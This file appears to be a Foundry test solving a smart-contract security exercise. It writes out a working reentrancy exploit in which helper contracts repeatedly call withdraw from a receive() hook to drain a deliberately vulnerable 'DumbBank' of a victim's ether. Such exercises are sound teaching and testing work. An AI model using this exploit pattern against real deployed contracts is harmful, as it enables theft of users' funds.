// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {DumbBank, IDumbBank} from "../src/DumbBankRobber.sol";

pragma solidity ^0.8.0;

contract DumbBankRobberTest is Test {
    DumbBank dumbBank;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.startPrank(victim);
        dumbBank = new DumbBank();
        dumbBank.deposit{value: 10 ether}();
        vm.stopPrank();
        vm.deal(attacker, 1 ether);
    }

    function testDumbBankRobber() public {
        uint256 currentNonce = vm.getNonce(attacker);
        vm.prank(attacker);
        new BankRobber{value: 1 ether}(IDumbBank(address(dumbBank)));
        assertEq(address(dumbBank).balance, 0);
        assertEq(vm.getNonce(attacker), currentNonce + 1);
    }
}

contract BankRobber {
    IDumbBank dumbBank;

    constructor(IDumbBank _dumbBank) payable {
        dumbBank = _dumbBank;
        BankRobberCaller caller = new BankRobberCaller(dumbBank);
        caller.callRobber{value: 1 ether}();
    }
}

contract BankRobberCaller {
    IDumbBank dumbBank;

    constructor(IDumbBank _dumbBank) {
        dumbBank = _dumbBank;
    }

    function callRobber() public payable {
        dumbBank.deposit{value: 1 ether}();
        dumbBank.withdraw(1 ether);
    }

    receive() external payable {
        if (address(dumbBank).balance >= 1 ether) {
            dumbBank.withdraw(1 ether);
        }
    }
}
